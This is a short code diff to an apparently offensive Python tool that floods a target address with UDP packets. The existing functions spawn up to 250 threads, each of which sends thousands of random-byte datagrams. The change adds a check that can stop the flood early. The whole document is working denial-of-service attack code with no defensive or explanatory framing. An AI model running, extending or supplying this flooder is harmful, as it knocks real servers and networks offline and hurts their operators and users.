@@ -1,14 +1,18 @@
 import socket,threading,sys,os
+from MODEL.data import read
 
 def UDP_ATTACK(s,size,addr):
     try:
-        for _ in range(2500):[s.sendto(os.urandom(size),addr) for _ in range(15)]
+        for _ in range(2500):
+            if read() == True:break
+            [s.sendto(os.urandom(size),addr) for _ in range(15)]
     except:
        pass
 
 def SOC(addr,size):
   try:
      for _ in range(250):
+      if read() == True:break
       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       threading.Thread(target=UDP_ATTACK,args=(s,size,addr)).start()
   except:pass
